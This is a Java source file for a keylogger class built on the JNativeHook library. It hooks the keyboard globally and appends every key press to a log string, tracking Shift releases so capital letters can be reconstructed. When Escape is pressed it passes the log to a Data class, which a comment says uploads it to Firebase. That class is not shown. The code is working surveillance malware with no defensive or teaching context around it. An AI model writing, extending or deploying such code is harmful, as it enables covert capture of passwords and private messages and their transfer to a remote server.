import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.concurrent.ExecutionException;

public class Logger implements NativeKeyListener {

    // Log for all keyboard inputs
    private String log = "";

    public void nativeKeyPressed(NativeKeyEvent e) {

        // Log key inputs
        if (e.getKeyCode() == 57) {
            log += " ";
        } else {
            log += NativeKeyEvent.getKeyText(e.getKeyCode());
        }

        // Exit program if escape pressed and create new Data class to upload log to Firebase
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
                new Data(log);
            } catch (IOException | ExecutionException | InterruptedException | NativeHookException ex) {
                ex.printStackTrace();
            }
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    // Adds when shift is released to log to know which letters are capitalized
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == 42) {
            log += "ShiftReleased ";
        }
    }
}
